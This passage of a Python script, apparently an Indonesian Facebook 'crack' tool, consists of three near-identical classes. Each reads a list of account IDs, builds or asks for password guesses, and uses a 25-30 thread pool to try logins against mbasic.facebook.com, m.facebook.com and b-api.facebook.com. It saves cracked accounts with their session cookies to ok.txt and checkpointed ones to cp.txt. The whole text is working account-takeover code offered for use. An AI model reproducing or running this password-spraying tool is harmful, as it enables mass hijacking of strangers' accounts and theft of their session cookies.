  print(" 1.) Login Via token");time.sleep(0.07)
  print(" 2.) Login Via cookies");time.sleep(0.07)
  print(" 0.) Exit\n");time.sleep(0.07)
  sek=input("Crack/>: ");time.sleep(0.07)
  
  if sek=="":
    print((" {} isi yang bener{}").format(R,N));logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="0":
    exit()
  else:
    print(("{}isi yang benar{}").format(R,N));logs()
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n\033[0;97m[+] Jika Ingin Crack Manu Ketik y  Jika Tidak Ketik [t/y]")
		while True:
			f=input("Input: ")
			
			if f=="":continue
			elif f=="t":
				try:
					while True:
						try:
							self.apk=input("\033[0;97m[+]ID list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print ("\033[0;97m[+]example pass123,pass12345")
				self.pwlist()
				break
			elif f=="y":
				try:
					while True:
						try:
							self.apk=input("\033[0;97m[+]ID list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print ("\033[0;97m[+]Crack started...");time.sleep(0.07)
				print ("\033[0;97m[+]Hasil Account ok saved to: ok.txt");time.sleep(0.07)
				print ("\033[0;97m[+]Hasil Account checkpoint saved to: checkpoint.txt");time.sleep(0.07)
				
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				break
	def pwlist(self):
		self.pw=input("  password list: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ("\033[0;97m started...");time.sleep(0.07)
			print ("\033[0;97m Account ok saved to: ok.txt");time.sleep(0.07)
			print ("\033[0;97mHasil Account checkpoint saved to: checkpoint.txt");time.sleep(0.07)
			
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r[OK]%s %s|%s %s      "%(G,fl.get("id"),i,N)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print(("\r[CP]%s %s|%s %s      "%(O,fl.get("id"),i,N)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n\033[0;97m[+] Jika Ingin Crack Manu Ketik y  Jika Tidak Ketik t [t/y]")
		while True:
			f=input("  Input: ")
			if f=="":continue
			elif f=="t":
				try:
					while True:
						try:
							self.apk=input("[+]ID list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print ("\033[0;97m[+]example pass123,pass12345")
				self.pwlist()
				break
			elif f=="y":
				try:
					while True:
						try:
							self.apk=input("\033[0;97m[+]ID list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print ("\033[0;97m[+]Crack started...");time.sleep(0.07)
				print ("\033[0;97m[+]Hasil Account ok saved to: ok.txt");time.sleep(0.07)
				print ("\033[0;97m[+]Hasil Account checkpoint saved to: checkpoint.txt");time.sleep(0.07)
				
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				
				break
	def pwlist(self):
		self.pw=input("password list: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ("\033[0;97mCrack started...");time.sleep(0.07)
			print ("\033[0;97mHasil Account ok saved to: ok.txt");time.sleep(0.07)
			print ("\033[0;97mHasil Account saved to: checkpoint.txt");time.sleep(0.07)
			
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print(("\r[OK]%s %s|%s %s      "%(G,fl.get("id"),i,N)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print(("\r[CP]%s %s|%s %s      "%(O,fl.get("id"),i,N)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n[+] Jika Ingin Crack Manual Ketik y  Jika Tidak Ketik t [D/m]")
		while True:
			f=input("  Input: ")
			if f=="":continue
			elif f=="t":
				try:
					while True:
						try:
							self.apk=input("\033[0;97m[+]ID list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print ("\033[0;97m[+]example pass123,pass12345")
				self.pwlist()
				break
			elif f=="y":
				try:
					while True:
						try:
							self.apk=input("\033[0;97m[+]ID list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print ("\033[0;97m[+]Crack started...");time.sleep(0.07)
				print ("\033[0;97m[+]Hasil Account ok saved to: ok.txt");time.sleep(0.07)
				print ("\033[0;97m[+]Hasil Account chekpoint saved to: cp.txt");time.sleep(0.07)
				
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				
				break
	def pwlist(self):
		self.pw=input("\033[0;97m[+]password list: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ("\033[0;97mCrack started...");time.sleep(0.07)
			print ("\033[0;97mHasil Account ok saved to: ok.txt");time.sleep(0.07)
			print ("\033[0;97mHasil Account saved to: checkpoint.txt");time.sleep(0.07)
			
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://b-api.facebook.com")
				if log.get("status")=="success":
					print(("\r[OK]%s %s|%s %s      "%(G,fl.get("id"),i,N)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print(("\r[CP]%s %s|%s %s      "%(O,fl.get("id"),i,N)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
			
if __name__=='__main__':
  license()
  basecookie()